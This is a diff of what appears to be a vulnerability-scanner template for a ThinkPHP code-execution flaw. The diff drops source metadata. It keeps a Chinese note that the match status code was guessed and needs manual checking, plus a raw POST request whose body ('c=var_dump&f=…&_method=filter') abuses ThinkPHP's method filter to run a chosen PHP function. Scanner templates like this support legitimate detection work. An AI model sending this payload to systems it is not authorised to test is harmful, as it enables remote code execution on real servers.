@@ -3,19 +3,11 @@ info:
   name: thinkphp_method_filter_code_exec
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/von1ne4b12235xu3
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: von1ne4b12235xu3
-    fofa: 暂无
 http:
 - raw:
   - 'POST /index.php?s=index/index/index HTTP/1.1
-
-
 
 
     c=var_dump&f=4e5e5d7364f443e28fbf0d3ae744a59a&_method=filter
